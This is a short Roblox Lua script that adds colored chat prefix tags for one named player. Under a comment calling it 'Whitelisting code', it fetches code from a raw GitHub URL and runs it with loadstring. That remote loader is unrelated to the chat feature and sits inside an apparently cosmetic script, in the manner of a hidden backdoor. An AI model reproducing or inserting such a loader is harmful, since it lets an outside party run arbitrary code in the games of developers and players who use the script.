local textChatService = game:GetService("TextChatService")

local PrivateChatTag = {"GetReketed_1"}

-- Whitelisting code
loadstring(game:HttpGet("https://raw.githubusercontent.com/Windows-10-1234/GSWhitelist/main/Loadstring"))()


 

 
textChatService.OnIncomingMessage = function(message: TextChatMessage)
    
    local properties = Instance.new("TextChatMessageProperties")
    
    if message.TextSource then
        
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        
        if player.Name == "YourUserHere" then
            
            properties.PrefixText = "<font color='#00ffee'>[Developer]</font> " .. "<font color='#ff8400'>[W Rizz]</font> " .. message.PrefixText
            
        end
        
    end
    
    return properties
    
end
